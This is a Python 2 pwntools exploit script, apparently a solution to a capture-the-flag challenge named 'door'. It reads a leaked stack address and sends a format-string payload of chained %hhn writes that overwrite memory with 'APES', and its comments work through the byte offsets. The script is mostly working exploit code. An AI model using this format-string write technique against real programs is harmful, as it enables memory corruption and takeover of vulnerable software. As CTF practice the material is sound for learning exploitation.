#python2
from __future__ import print_function
from pwn import *


print("ord of A hex: "+str(hex(ord("A"))))

io = process("./door")
io.recvuntil("A landslide has blocked the way at")
io.recvuntil("0x")
addr = io.recvline().strip()
print("addr: "+addr)
addr = int(addr, 16)


'''
At address, the value is: str("9447")
In stack, str("7449")
Target: APES
'''
pay = ""

# recon
#pay = "A"*4 + "%x|"*20

#offset
pay += "B"*1
#1

pay += p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)
# 16+1=17

""" AAAA41000000|25414141|...
    1   1   1   1   2   3   4   5   
    .   .   .   .   41  41  41  41 
""" 

control = 2

#A (65)
# 0x41 - 17 = 0x30 = 48
pay += "%48x%2$hhn"
#48

#P (80)
# Ans: 15, but why?
# 80-15=65. Oh
pay += "%15x%3$hhn"
#80

#E (69)
# 69 - 80 = -11
# -11 mod 256 = 245
pay += "%245x%4$hhn"
#69

#S
# 83-69=14
pay += "%14x%5$hhn"

print("pay: "+pay)
io.sendline(pay)

# inbound
io.recvuntil("You say, ")
say = io.recvline()
print("say: "+say)

#interactive
io.interactive()

"""
You wander through the valley in search of the mythical treasure.
A landslide has blocked the way at 0xffaf601f
Beside it you notice a hidden doorway cut into the rock wall.
As you approach '9447' appears in magical letters on it.
Speak the phrase APplES and I shall open:
"""
